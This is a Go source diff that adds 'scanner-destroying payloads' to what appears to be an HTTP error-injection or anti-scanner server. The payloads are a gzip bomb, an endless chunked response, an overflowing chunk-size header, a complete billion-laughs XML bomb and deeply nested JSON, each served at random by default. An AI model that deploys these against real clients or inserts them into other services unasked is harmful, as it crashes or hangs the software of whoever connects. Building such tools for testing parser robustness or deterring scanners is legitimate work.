@@ -1,6 +1,7 @@
 package errors
 
 import (
+	"compress/gzip"
 	crand "crypto/rand"
 	"fmt"
 	"math/rand"
@@ -73,6 +74,13 @@ const (
 
 	// Protocol-level glitches — connection violations
 	ErrKeepAliveUpgrade  ErrorType = "keepalive_upgrade"   // both Connection: keep-alive and Upgrade: websocket
+
+	// Scanner-destroying payloads
+	ErrGzipBomb          ErrorType = "gzip_bomb"           // valid gzip that decompresses to massive size
+	ErrInfiniteChunked   ErrorType = "infinite_chunked"    // chunked response that never terminates
+	ErrChunkOverflow     ErrorType = "chunk_overflow"      // malformed chunk size to overflow parsers
+	ErrXMLBomb           ErrorType = "xml_bomb"            // billion laughs XML entity expansion
+	ErrJSONDepthBomb     ErrorType = "json_depth_bomb"     // deeply nested JSON causing stack overflow
 )
 
 // ErrorProfile defines probabilities for each error type.
@@ -84,7 +92,7 @@ type ErrorProfile struct {
 func DefaultProfile() ErrorProfile {
 	return ErrorProfile{
 		Weights: map[ErrorType]float64{
-			ErrNone:              0.594,
+			ErrNone:              0.584,
 			Err500:               0.03,
 			Err502:               0.02,
 			Err503:               0.02,
@@ -134,6 +142,12 @@ func DefaultProfile() ErrorProfile {
 			ErrFalseCompression: 0.002,
 			ErrMultiEncodings:   0.002,
 			ErrKeepAliveUpgrade: 0.002,
+			// Scanner-destroying payloads
+			ErrGzipBomb:        0.002,
+			ErrInfiniteChunked: 0.002,
+			ErrChunkOverflow:   0.002,
+			ErrXMLBomb:         0.002,
+			ErrJSONDepthBomb:   0.002,
 		},
 	}
 }
@@ -142,7 +156,7 @@ func DefaultProfile() ErrorProfile {
 func AggressiveProfile() ErrorProfile {
 	return ErrorProfile{
 		Weights: map[ErrorType]float64{
-			ErrNone:             0.056,
+			ErrNone:             0.016,
 			Err500:              0.06,
 			Err502:              0.05,
 			Err503:              0.05,
@@ -192,6 +206,12 @@ func AggressiveProfile() ErrorProfile {
 			ErrFalseCompression: 0.008,
 			ErrMultiEncodings:   0.008,
 			ErrKeepAliveUpgrade: 0.008,
+			// Scanner-destroying payloads
+			ErrGzipBomb:        0.008,
+			ErrInfiniteChunked: 0.008,
+			ErrChunkOverflow:   0.008,
+			ErrXMLBomb:         0.008,
+			ErrJSONDepthBomb:   0.008,
 		},
 	}
 }
@@ -711,6 +731,44 @@ func (g *Generator) Apply(w http.ResponseWriter, r *http.Request, errType ErrorT
 		w.WriteHeader(http.StatusOK)
 		w.Write([]byte("<html><body>Keep-alive + Upgrade conflict</body></html>"))
 		return true
+
+	// ---- Scanner-destroying payloads ----
+
+	case ErrGzipBomb:
+		g.gzipBomb(w)
+		return true
+
+	case ErrInfiniteChunked:
+		g.infiniteChunked(w)
+		return true
+
+	case ErrChunkOverflow:
+		// Send chunked response with absurdly large chunk size to overflow parsers
+		hj, ok := w.(http.Hijacker)
+		if !ok {
+			w.WriteHeader(500)
+			return true
+		}
+		conn, buf, err := hj.Hijack()
+		if err != nil {
+			return true
+		}
+		defer conn.Close()
+		buf.WriteString("HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html\r\n\r\n")
+		// Chunk size that would be 2^64-1 bytes — parsers that allocate based on this will OOM or crash
+		buf.WriteString("FFFFFFFFFFFFFFFF\r\n")
+		buf.WriteString("<html>small body</html>\r\n")
+		buf.WriteString("0\r\n\r\n")
+		buf.Flush()
+		return true
+
+	case ErrXMLBomb:
+		g.xmlBomb(w)
+		return true
+
+	case ErrJSONDepthBomb:
+		g.jsonDepthBomb(w)
+		return true
 	}
 
 	return false
@@ -731,6 +789,112 @@ func (g *Generator) slowDrip(w http.ResponseWriter) {
 	}
 }
 
+// gzipBomb sends a valid gzip stream that decompresses to ~10MB from a tiny payload.
+// Scanners that auto-decompress will allocate massive memory.
+func (g *Generator) gzipBomb(w http.ResponseWriter) {
+	w.Header().Set("Content-Type", "text/html")
+	w.Header().Set("Content-Encoding", "gzip")
+	w.WriteHeader(http.StatusOK)
+
+	// Build a valid gzip stream containing zeros that compresses extremely well.
+	// 10MB of zeros compresses to ~10KB of gzip data, but decompresses back to 10MB.
+	// We create it on-the-fly using compress/gzip.
+	gzw, err := gzip.NewWriterLevel(w, gzip.BestCompression)
+	if err != nil {
+		return
+	}
+	// Write 10MB of repeated pattern — compresses to tiny gzip but expands on decompression
+	chunk := make([]byte, 65536) // 64KB block of zeros
+	for i := 0; i < 160; i++ {  // 160 * 64KB = 10MB
+		if _, err := gzw.Write(chunk); err != nil {
+			break
+		}
+	}
+	gzw.Close()
+}
+
+// infiniteChunked sends a chunked response that never terminates.
+// Scanners waiting for the response to complete will hang forever.
+func (g *Generator) infiniteChunked(w http.ResponseWriter) {
+	hj, ok := w.(http.Hijacker)
+	if !ok {
+		w.WriteHeader(500)
+		return
+	}
+	conn, buf, err := hj.Hijack()
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+
+	buf.WriteString("HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html\r\n\r\n")
+	// Send initial chunk
+	body := "<html><body><h1>Loading...</h1>"
+	buf.WriteString(fmt.Sprintf("%x\r\n%s\r\n", len(body), body))
+	buf.Flush()
+
+	// Keep sending tiny chunks every 2 seconds for up to 5 minutes.
+	// This holds connections open, exhausting scanner connection pools.
+	padding := "<!-- keep-alive padding -->"
+	deadline := time.Now().Add(5 * time.Minute)
+	for time.Now().Before(deadline) {
+		chunk := fmt.Sprintf("%x\r\n%s\r\n", len(padding), padding)
+		if _, err := buf.WriteString(chunk); err != nil {
+			return
+		}
+		if err := buf.Flush(); err != nil {
+			return
+		}
+		time.Sleep(2 * time.Second)
+	}
+	// Never send the terminating "0\r\n\r\n" — just close
+}
+
+// xmlBomb sends a billion laughs XML payload that expands exponentially.
+// XML parsers that resolve entities will allocate gigabytes.
+func (g *Generator) xmlBomb(w http.ResponseWriter) {
+	w.Header().Set("Content-Type", "application/xml")
+	w.WriteHeader(http.StatusOK)
+
+	// Classic billion laughs attack — each entity expands 10x the previous.
+	// lol9 = 10^9 copies of "lol" = ~3GB of text from a few hundred bytes.
+	bomb := `<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>`
+
+	w.Write([]byte(bomb))
+}
+
+// jsonDepthBomb sends deeply nested JSON that causes stack overflow in recursive parsers.
+func (g *Generator) jsonDepthBomb(w http.ResponseWriter) {
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(http.StatusOK)
+
+	// Build JSON with 100,000 levels of nesting — recursive parsers will stack overflow.
+	// Most JSON parsers use recursion; 100K levels exceeds any reasonable stack.
+	depth := 100000
+	var b strings.Builder
+	b.Grow(depth*2 + 50)
+	for i := 0; i < depth; i++ {
+		b.WriteString(`{"a":`)
+	}
+	b.WriteString(`"boom"`)
+	for i := 0; i < depth; i++ {
+		b.WriteByte('}')
+	}
+	w.Write([]byte(b.String()))
+}
+
 // IsError returns true if the error type represents a failure.
 func IsError(et ErrorType) bool {
 	switch et {
@@ -748,7 +912,8 @@ func IsProtocolGlitch(et ErrorType) bool {
 		ErrH2UpgradeReject, ErrFalseH2Preface, ErrH2BadStreamID, ErrH2PriorityLoop, ErrFalseServerPush,
 		ErrDuplicateStatus, ErrHeaderNullBytes, ErrMissingCRLF, ErrHeaderObsFold,
 		ErrBothCLAndTE, ErrFalseCompression, ErrMultiEncodings,
-		ErrKeepAliveUpgrade:
+		ErrKeepAliveUpgrade,
+		ErrGzipBomb, ErrInfiniteChunked, ErrChunkOverflow, ErrXMLBomb, ErrJSONDepthBomb:
 		return true
 	default:
 		return false
